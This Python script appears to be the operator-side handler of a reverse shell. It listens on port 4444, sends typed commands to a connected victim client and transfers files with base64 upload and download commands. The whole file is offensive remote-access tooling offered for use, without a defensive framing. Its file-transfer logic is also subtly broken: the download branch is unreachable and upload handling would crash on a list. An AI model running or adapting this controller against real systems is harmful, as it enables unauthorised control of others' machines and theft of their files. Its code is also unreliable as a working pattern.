import socket
import json
import os
import base64
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "127.0.0.1"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Function to send JSON data
def send_json(conn, data):
    json_data = json.dumps(data)
    conn.send(json_data.encode())

# Function to receive JSON data
def receive_json(conn):
    json_data = ""
    while True:
        try:
            json_data += conn.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Function to write file
def write_file(path, content):
    with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
        file.write(base64.b64decode(content))
        return "[+] Download successful [+]"

# Function to read file
def read_file(path):
    with open(path, "rb") as file:  # RB FOR READABLE BINARY FILE
        return base64.b64encode(file.read()).decode()  # Decode bytes to string

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

try:
    while True:
        # Receive the prompt from the client
        prompt = receive_json(client_socket)
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()

        # Handle upload command
        if command.startswith("upload"):
            try:
                _, filename = command.split(" ", 1)
                file_content = read_file(filename)
                command = [command, file_content]
            except Exception:
                print(Fore.RED + "[+] Error reading file for upload [+]")
                continue

        # Send the command to the client
        send_json(client_socket, command)

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Receive the output from the client
        output = receive_json(client_socket)

        # Handle download command
        if isinstance(command, list) and command[0].startswith("download"):
            try:
                _, filename = command
                output = write_file(filename, output)
            except Exception:
                output = "[+] Error during download [+]"

        print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
